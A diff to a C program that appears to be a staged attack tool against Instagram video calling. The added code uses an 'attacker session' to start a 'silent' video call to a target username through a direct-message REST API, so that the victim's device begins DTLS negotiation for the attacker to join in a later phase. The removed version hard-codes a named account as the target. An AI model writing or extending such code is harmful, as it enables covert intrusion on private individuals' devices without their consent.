@@ -34,9 +34,29 @@ static void escape_for_shell(char *dest, size_t dest_size, const char *src) {
     dest[j] = '\0';
 }
 
-/* PHASE 1: GraphQL로 luciaryu_에게 영상통화 요청 (doc_id 자동 발견) */
+/* PHASE 1: REST API로 직접 video call 시작 */
 static int phase_1_graphql_video_call(const char *target_username) {
-    print_phase_header(1, "GraphQL: Initiate Silent Video Call (Auto doc_id Discovery)");
+    print_phase_header(1, "REST API: Direct Video Call (DM API)");
+
+    printf("\n[*] 목표: %s에게 영상통화 요청 (공격자 세션)\n", target_username);
+    printf("[*] 방법: Direct Message REST API → 직접 video_call 시작\n");
+    printf("[*] 결과: 상대 기기 DTLS 협상 자동 시작\n\n", target_username);
+
+    /* REST API 사용 */
+    if (initiate_video_call_direct(target_username) < 0) {
+        printf("\n[-] Video call 시작 실패\n");
+        return -1;
+    }
+
+    printf("[✓] PHASE 1 Complete: 영상통화 신호 전송됨\n");
+    printf("[✓] 상대 기기: DTLS 협상 중 (자동)\n");
+    printf("[✓] 다음 단계: 우리도 DTLS 협상에 참여 (PHASE 2)\n\n");
+    return 0;
+}
+
+/* Old GraphQL version - DEPRECATED */
+static int phase_1_graphql_video_call_old(const char *target_username) {
+    print_phase_header(1, "GraphQL: Initiate Silent Video Call (Auto doc_id Discovery) [OLD]");
 
     printf("\n[*] 목표: luciaryu_에게 영상통화 요청 (공격자 세션)\n");
     printf("[*] 방법: GraphQL API → Instagram 시그널링 (최적 doc_id 자동 발견)\n");
